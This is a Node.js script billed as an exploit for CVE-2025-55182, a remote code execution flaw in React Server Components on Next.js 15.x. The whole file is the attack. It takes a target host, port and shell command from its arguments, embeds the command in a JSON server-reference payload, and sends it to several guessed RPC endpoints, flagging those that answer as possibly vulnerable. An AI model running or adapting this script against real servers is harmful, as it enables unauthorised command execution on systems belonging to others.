#!/usr/bin/env node

const http = require('http');
const https = require('https');

/**
 * CVE-2025-55182 Exploit
 * React Server Components Remote Code Execution
 * 
 * Based on publicly available PoC from Lachlan Davidson (react2shell.com)
 */

const TARGET_HOST = process.argv[2] || '192.168.147.100';
const TARGET_PORT = process.argv[3] || 3000;
const COMMAND = process.argv[4] || 'id';

console.log(`
╔══════════════════════════════════════════════════════════════╗
║       CVE-2025-55182 React Server Components RCE             ║
║              Exploit for Next.js 15.x                        ║
║       Target: ${TARGET_HOST}:${TARGET_PORT}                      ║
╚══════════════════════════════════════════════════════════════╝
`);

function createPayload(cmd) {
  const payload = {
    id: 1,
    method: 'POST',
    path: '/_rpc/handle',
    body: JSON.stringify({
      __type: 'CallServerReference',
      __id: '0',
      __bound: [cmd]
    })
  };
  
  return JSON.stringify(payload);
}


function sendExploit() {
  const protocol = TARGET_PORT === 443 ? https : http;
  
  const endpoints = [
    '/_rpc/0',
    '/_rpc/default',
    '/_rpc/handle',
    '/api/rsc',
    '/rsc'
  ];
  
  endpoints.forEach((endpoint) => {
    const payload = createPayload(COMMAND);
    
    const options = {
      hostname: TARGET_HOST,
      port: TARGET_PORT,
      path: endpoint,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Accept': 'application/json'
      }
    };
    
    console.log(`[*] Trying endpoint: ${endpoint}`);
    
    const req = protocol.request(options, (res) => {
      let data = '';
      
      res.on('data', (chunk) => {
        data += chunk;
      });
      
      res.on('end', () => {
        console.log(`[+] Response Status: ${res.statusCode}`);
        console.log(`[+] Response: ${data.substring(0, 200)}`);
        
        if (res.statusCode === 200 || res.statusCode === 500) {
          console.log(`[!] Endpoint might be vulnerable: ${endpoint}`);
        }
      });
    });
    
    req.on('error', (error) => {
      console.error(`[-] Error: ${error.message}`);
    });
    
    req.write(payload);
    req.end();
  });
}

sendExploit();